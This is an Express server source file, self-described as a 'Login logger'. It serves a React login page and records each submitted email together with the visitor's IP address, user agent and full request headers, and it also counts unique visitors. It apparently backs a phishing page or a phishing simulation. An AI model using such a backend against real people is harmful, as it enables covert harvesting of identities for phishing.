import express from 'express';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';
import fs from 'fs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 10000;

// Set to track unique visitor IP addresses
const uniqueVisitors = new Set();

// Find dist folder - check both root and src directory
let distPath = path.join(__dirname, 'dist');
if (!fs.existsSync(distPath)) {
  // Try parent directory (in case server.js is in src/)
  distPath = path.join(__dirname, '..', 'dist');
}

if (!fs.existsSync(distPath)) {
  console.error('❌ ERROR: dist folder not found!');
  console.error('Searched in:', path.join(__dirname, 'dist'));
  console.error('And in:', path.join(__dirname, '..', 'dist'));
  console.error('Please run "npm run build" first.');
  process.exit(1);
}

console.log('✅ dist folder found at:', distPath);
console.log('📂 Files in dist:', fs.readdirSync(distPath));

app.use(cors({
  origin: [
    'http://localhost:3000',
    'http://localhost:5173',
    'https://notificationalarm.com'
  ]
}));

app.use(express.json());

// API routes MUST come before static file serving
// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'Logger service running', timestamp: new Date().toISOString() });
});

// Log login attempts
app.post('/api/log-attempt', (req, res) => {
  const { email, timestamp, date, time, userAgent, url } = req.body;
  
  console.log('🔐 LOGIN ATTEMPT DETECTED:');
  console.log('==========================================');
  console.log(`📧 Email: ${email}`);
  console.log(`⏰ Timestamp: ${timestamp}`);
  console.log(`📅 Date: ${date}`);
  console.log(`🕐 Time: ${time}`);
  console.log(`🌐 User Agent: ${userAgent}`);
  console.log(`🔗 URL: ${url}`);
  console.log(`🌍 IP Address: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}`);
  console.log(`🗂️ Headers: ${JSON.stringify(req.headers, null, 2)}`);
  console.log('==========================================\n');

  res.json({ 
    success: true,
    message: 'Login attempt logged successfully',
    timestamp: new Date().toISOString()
  });
});

// Log visitor information and count unique visitors
app.post('/api/log-visit', (req, res) => {
  const { timestamp, userAgent, url } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  uniqueVisitors.add(ip);

  console.log('👁️ SITE VISIT DETECTED');
  console.log('==========================================');
  console.log(`⏰ Timestamp: ${timestamp}`);
  console.log(`🌐 User Agent: ${userAgent}`);
  console.log(`🔗 URL: ${url}`);
  console.log(`🌍 IP Address: ${ip}`);
  console.log(`🗂️ Headers: ${JSON.stringify(req.headers, null, 2)}`);
  console.log(`📊 Unique visitors so far: ${uniqueVisitors.size}`);
  console.log('==========================================\n');

  res.json({ success: true, uniqueVisitorsCount: uniqueVisitors.size });
});

// Serve static files from React build directory
app.use(express.static(distPath));

// Serve React app for all other routes (SPA fallback)
app.get('*', (req, res) => {
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Login logger running on port ${PORT}`);
  console.log(`📂 Serving static files from: ${distPath}`);
});